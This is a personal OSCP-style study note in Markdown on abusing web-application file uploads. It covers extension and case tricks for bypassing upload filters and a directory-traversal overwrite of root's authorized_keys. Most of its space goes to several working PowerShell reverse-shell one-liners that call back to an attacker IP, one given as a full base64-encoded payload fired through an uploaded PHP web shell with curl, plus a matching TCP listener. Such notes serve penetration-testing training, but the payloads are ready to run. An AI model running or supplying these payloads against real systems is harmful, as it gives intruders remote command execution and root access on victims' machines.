---
aliases: 
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - web_app_attack
  - file_upload
author: Mehdi N Tehrani
creat_date: 2023-12-23
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Using Executable Files
#executable
## Approaches
1. Try various extension in case one or some are forbidden to be uploaded:
`.php`
`.phtml`
`.phps`
`.php7`
2. Also try various cases:
`PhtMl`
3. Sometimes can upload a file that server accepts, then rename it to another extension
## PowerShell Reverse Shell - One-liner
#powershell #reverse_shell #one-liner #base64_encoded #base64
```powershell
$rhost='<attacker_ip>'; $rport=<port>

$Text = '$client = New-Object System.Net.Sockets.TCPClient($rhost,$rport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
```
Http call to victim machine:
`curl http://<victim_ip>/meteor/uploads/simple-backdoor.php?cmd=powershell%20-enc%20<base64-encoded-reverse-shell>`

# Non-executable Files
#non-executable
- Combined with **directory traversal**, can be used to overwrite files such as `authorized_keys`
	- we can upload a file to `../../../../../root/.ssh/autorized_keys` which contains **our** public key, so with our private key we can ssh into the host as root user.
- Can also be used combined with XXE and XSS attacks.

Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the [IIS Application Pool Identities](https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). These are virtual accounts running web applications grouped by [application pools](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools). Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.


# Require User Interaction
e.g. upload a malicious `docx` file






# powershell reverse shell
#powershell #reverse_shell 
```
$HOST='192.168.45.216'; $PORT=7777

$Text = '$client = New-Object System.Net.Sockets.TCPClient($HOST,$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
```


Didn't WORK!!!!!
> Make sure the encoding is done in **Unicode**
#powershell #pwsh #revsh #revshell #rev_shell #raw_code #base64 #b64
```powershell
PS C:\> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$c=new-object System.Net.Sockets.TcpClient("192.168.45.216", 443); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.length)) -ne 0){$d=(new-object System.Text.ASCIIEncoding).GetString($b,0,$i); $sb=(iex $d 2>&1 | Out-String)+"$ ";$sbb=([System.Text.Encoding]::ASCII.GetBytes($sb));$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()'))
```

```sh
$ curl 'http://<victim>/meteor/uploads/sb.pHp?cmd=powershell%20-enc%20JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADEANgAiACwAIAA0ADQAMwApADsAIAAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4AbABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7ACAAJABzAGIAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAKwAiACQAIAAiADsAJABzAGIAYgA9ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGIAKQApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIAYgAsADAALAAkAHMAYgBiAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA'
```

## Powershell Reverse Shell
```powershell
$RHOST='192.168.45.216'; $RPORT=8888; $c=new-object System.Net.Sockets.TcpClient($RHOST, $RPORT); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.length)) -ne 0){$d=(new-object System.Text.ASCIIEncoding).GetString($b,0,$i); $sb=(iex $d 2>&1|Out-String)+"PS $(pwd)> ";$sbb=([System.Text.Encoding]::ASCII.GetBytes($sb));$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()
```

## Powershell TCP Listener
```powershell
$l = [System.Net.Sockets.TcpListener]8888; $l.Start(); $c = $l.AcceptTcpClient(); $e=[System.Net.IPEndPoint] $c.Client.RemoteEndPoint; Write-Host "Connection received from: $($e.Address)"; $enc = [System.Text.Encoding]::ASCII; $s=$c.GetStream(); $sw=[System.IO.StreamWriter]$s; while ($c.Connected) { $cmd=Read-Host; $sw.WriteLine($cmd); $sw.flush(); $b=New-Object byte[] 1024; $out=''; while(!$s.DataAvailable){sleep .1}; while ($s.DataAvailable) { $i=$s.Read($b,0,$b.Length); $out+=$enc.GetString($b,0,$i)} Write-Host -NoNewLine $out } $c.close()
```